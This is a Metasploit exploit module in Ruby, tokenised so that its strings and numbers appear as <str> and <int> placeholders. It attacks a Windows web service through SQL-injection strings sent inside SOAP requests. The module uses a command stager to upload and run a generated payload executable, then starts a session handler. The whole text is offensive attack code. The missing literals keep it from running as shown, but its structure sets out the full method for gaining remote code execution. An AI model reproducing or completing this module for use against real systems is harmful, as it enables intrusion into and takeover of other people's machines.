require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = ExcellentRanking include Msf :: Exploit :: CmdStager include Msf :: Exploit :: Remote :: HttpClient include Msf :: Exploit :: EXE def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > [ [ <str> , { <str> = > ARCH_X86 , <str> = > <str> } ] ] , <str> = > <str> , <str> = > true , <str> = > <str> , <str> = > <str> , <str> = > <int> ) ) register_options ( [ Opt :: RPORT ( <int> ) , OptBool . new ( <str> , [ true , <str> , true ] ) , OptString . new ( <str> , [ false , <str> , <str> ] ) ] , self . class ) end def windows_stager print_status ( <str> datastore [ <str> ] <str> datastore [ <str> ] <str> ) execute_cmdstager ( { <str> = > <str> } ) @payload_exe = generate_payload_exe print_status ( <str> ) execute_command ( @payload_exe ) end def execute_command ( cmd , opts = { } ) inject = [ <str> , <str> , <str> cmd <str> , ] inject . each do | sqli | soap = <str> sqli <str> res = send_request_cgi ( { <str> = > <str> , <str> = > <str> , <str> = > <str> , <str> = > <str> , <str> = > soap , } , <int> ) if ( res and res . body =~ <str> ) else fail_with ( Failure :: Unknown , <str> ) end end end def exploit if not datastore [ <str> ] . empty? print_status ( <str> datastore [ <str> ] <str> ) execute_command ( datastore [ <str> ] ) return end case target [ <str> ] when <str> windows_stager else fail_with ( Failure :: Unknown , <str> ) end handler end end 
